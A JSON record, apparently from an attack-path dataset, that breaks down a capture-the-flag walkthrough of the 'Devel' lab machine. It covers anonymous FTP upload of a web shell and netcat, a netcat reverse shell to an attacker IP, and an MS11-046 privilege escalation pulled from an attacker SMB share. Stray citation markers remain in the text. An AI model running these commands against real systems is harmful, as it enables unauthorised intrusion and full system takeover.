{  "id": "ap-0011",  "title": "Devel: Anonymous FTP Access, RCE via Web Shell, and MS11-046 Privilege Escalation",  "summary": "Exploiting Anonymous FTP access to deliver a web shell and netcat binary, achieving Remote Code Execution (RCE), and escalating privileges using a publicly available kernel exploit (MS11-046).",  "attack_path_markdown": "### Step 1\nPing the target and perform a full TCP port scan using Nmap. Identify open ports 21 (FTP) and 80 (HTTP) .\n### Step 2\nEnumerate services to confirm Anonymous FTP access and identify the web server as IIS 7.5 . Prepare the ASPX web shell and Netcat binary for upload .\n### Step 3\nUtilize Anonymous FTP to upload the prepared payloads (web shell and Netcat) to the synchronized web root directory (`C:\\inetpub\\wwwroot`) [7, 8].\n### Step 4\nAccess the web shell to gain RCE, triggering the Netcat reverse shell connection .\n### Step 5\nIdentify the Windows 7 operating system version and select the MS11-046 kernel exploit [10, 11]. Transfer the exploit binary via SMB to a temporary directory on the victim machine [12, 13].\n### Step 6\nExecute the exploit to escalate privileges to `NT AUTHORITY\\SYSTEM` and retrieve flags .",  "kill_chain": [    {      "phase_order": 1,      "phase_name": "Reconnaissance",      "description": "Discover the target host and enumerate open ports and running services.",      "actions": [        "Check host status and OS via ping/TTL",        "Perform full TCP port scan (Nmap)",        "Service and version enumeration on open ports"      ],      "tools": ["ping", "Nmap", "watweb"],      "techniques": ["Active Scanning", "OS Fingerprinting", "Service Enumeration"],      "mitre_ids": ["T1595.001", "T1046"],      "indicators": ["TTL 128 (Windows)", "Ports 21/80 open", "Anonymous FTP enabled", "Microsoft IIS 7.5"],      "preconditions": "Network connectivity to the target host.",      "expected_outcome": "Identification of open FTP (21) and HTTP (80) ports, confirmed as a Windows machine.",      "confidence": 0.9,      "commands": [        "ping 10.10.10.5 [1]",        "nmap -p- -sT --max-rate 5000 -v -n -Pn 10.10.10.5 -oG port ",        "nmap -sC -sV -p 21,80 10.10.10.5 -oN target.nmap ",        "whatweb 10.10.10.5 ",        "curl -s -I http://10.10.10.5 "      ]    },    {      "phase_order": 2,      "phase_name": "Weaponization",      "description": "Preparation of payloads (web shell and netcat) required for initial access and command execution.",      "actions": [        "Prepare ASPX web shell for RCE",        "Prepare Windows Netcat binary"      ],      "tools": ["ASPX Shell (from user/share/webshells/aspx/aspx_cmd_shell.aspx)", "Netcat (netcat.exe)"],      "techniques": ["T1071.001 (Web Protocols)", "T1059.003 (Windows Command Shell)", "T1105 (Ingress Tool Transfer)"],      "mitre_ids": ["T1071.001", "T1059.003", "T1105"],      "indicators": ["Existence of console.aspx and netcat.exe locally"],      "preconditions": "Identification of a vulnerable web service (IIS) and file upload capability (FTP).",      "expected_outcome": "Payloads ready for deployment.",      "confidence": 0.8    },    {      "phase_order": 3,      "phase_name": "Delivery",      "description": "Transmission of the web shell and netcat binary to the target machine via the vulnerable service.",      "actions": [        "Connect to FTP anonymously",        "Upload web shell (console.aspx)",        "Upload Netcat binary (netcat.exe)"      ],      "tools": ["ftp", "Python ftplib"],      "techniques": ["T1105 (Ingress Tool Transfer)"],      "mitre_ids": ["T1105"],      "indicators": ["FTP transfer complete message", "Files visible in the web root"],      "preconditions": "Anonymous FTP access enabled and synchronized with the web root (C:\\inetpub\\wwwroot) .",      "expected_outcome": "ASPX shell and Netcat binary successfully placed in the web root.",      "confidence": 0.9,      "commands": [        "ftp 10.10.10.5 ",        "user anonymous ",        "binary [6, 21]",        "put console.aspx ",        "put netcat.exe "      ]    },    {      "phase_order": 4,      "phase_name": "Exploitation",      "description": "Gaining initial access by executing the uploaded web shell to initiate a reverse connection.",      "actions": [        "Set up listener for reverse shell",        "Access web shell URL to execute command (RCE)",        "Receive reverse shell connection"      ],      "tools": ["Netcat (listener)", "Burp Suite (for request analysis)", "requests (Python library)", "pwn tools (interactive shell)"],      "techniques": ["T1190 (Exploit Public-Facing Application)", "T1059.003 (Windows Command Shell)"],      "mitre_ids": ["T1190", "T1059.003"],      "indicators": ["HTTP POST request to console.aspx", "Reverse shell received as iis apppool\\web"],      "preconditions": "Payloads successfully uploaded to the web root.",      "expected_outcome": "Establishment of an interactive command shell as a low-privileged user (iis apppool\\web).",      "confidence": 0.9,      "commands": [        "nc -lvnp 443 ",        "Execute command via POST data: C:\\inetpub\\wwwroot\\netcat.exe -e cmd 10.10.14.29 443 "      ]    },    {      "phase_order": 5,      "phase_name": "Installation",      "description": "Preparation and transfer of the privilege escalation exploit binary.",      "actions": [        "Identify system version (Windows 7/6.1 7600)",        "Select kernel exploit MS11-046 ",        "Transfer exploit to a temporary directory on the target via SMB"      ],      "tools": ["systeminfo", "MS11-046 exploit", "SMB share"],      "techniques": ["T1082 (System Information Discovery)", "T1105 (Ingress Tool Transfer)"],      "mitre_ids": ["T1082", "T1105"],      "indicators": ["System info shows vulnerable version", "Exploit transferred successfully (one file copied)"],      "preconditions": "Initial low-privileged shell access, ability to transfer files (SMB share set up).",      "expected_outcome": "Exploit binary (MS11-046.exe) ready for execution on the target.",      "confidence": 0.9,      "commands": [        "systeminfo [10]",        "mkdir C:\\Windows\\Temp\\privesc [12]",        "copy \\\\<Attacker_IP>\\smb_folder\\MS11-046.exe C:\\Windows\\Temp\\privesc\\MS11-046.exe [13]"      ]    },    {      "phase_order": 6,      "phase_name": "Command & Control",      "description": "Maintaining persistence and escalating session stability (N/A, the shell obtained in step 4 is used directly for escalation).",      "actions": [],      "tools": [],      "techniques": [],      "mitre_ids": [],      "indicators": [],      "preconditions": "",      "expected_outcome": "",      "confidence": 0.0    },    {      "phase_order": 7,      "phase_name": "Actions on Objectives",      "description": "Executing the kernel exploit to achieve maximum privileges (SYSTEM) and retrieve critical data (flags).",      "actions": [        "Execute the MS11-046 exploit",        "Confirm escalated privileges",        "Locate and retrieve user.txt and root.txt flags"      ],      "tools": ["MS11-046.exe"],      "techniques": ["T1068 (Exploitation for Privilege Escalation)"],      "mitre_ids": ["T1068"],      "indicators": ["User changes from 'iis apppool\\web' to 'nt authority\\system'", "Flag files retrieved"],      "preconditions": "MS11-046 exploit transferred successfully.",      "expected_outcome": "Full compromise of the system with SYSTEM privileges.",      "confidence": 1.0,      "commands": [        "whoami /priv ",        "C:\\Windows\\Temp\\privesc\\MS11-046.exe ",        "whoami [13]",        "dir /s user.txt "      ]    }  ],  "tactics": ["Reconnaissance", "Initial Access", "Execution", "Defense Evasion", "Privilege Escalation"],  "techniques": ["Active Scanning", "Anonymous FTP", "Remote Code Execution", "Exploitation for Privilege Escalation"],  "mitre_ids": ["T1595.001", "T1046", "T1190", "T1068"],  "hosts": ["10.10.10.5 (Victim)", "10.10.14.29 (Attacker)"],  "privs_obtained": ["iis apppool\\web", "nt authority\\system"],  "confidence": 0.9,  "source_file": "",  "notes": "The procedure includes an optional step to automate the initial access using Python scripting (ftplib and requests) [25-27]. The primary exploitation vector is Anonymous FTP file upload to the IIS web root, leading to RCE.",  "labels": ["attack_path", "windows", "ftp", "iis", "ms11-046"]}